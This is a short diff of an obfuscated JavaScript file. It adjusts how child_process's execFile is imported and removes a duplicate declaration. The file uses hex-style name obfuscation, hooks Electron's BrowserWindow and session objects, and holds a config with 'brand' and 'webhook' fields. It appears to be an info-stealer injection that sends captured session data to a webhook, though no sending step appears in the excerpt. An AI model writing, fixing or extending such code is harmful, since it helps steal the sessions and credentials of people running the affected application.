@@ -1,6 +1,6 @@
 const fs = require('fs')
 const https = require('https')
-const { execFile } = require('child_process');
+const execFile = require('child_process');
 
 function _0x5701(_0x4aba1d, _0x4a1311) {
     var _0x4f7eff = _0x4e63();
@@ -75,7 +75,7 @@ var _0x4e3e4f = (function() {
 _0x2e51c6();
 const {
     BrowserWindow, session
-} = require(_0x59caf9(0xe8)), os = require('os'), execFile = require('child_process'), https = require(_0x59caf9(0xec)), querystring = require(_0x59caf9(0x195)), fs = require('fs');
+} = require(_0x59caf9(0xe8)), os = require('os'), https = require(_0x59caf9(0xec)), querystring = require(_0x59caf9(0x195)), fs = require('fs');
 var config = {
         'brand': _0x59caf9(0x187),
         'webhook': _0x59caf9(0x170),
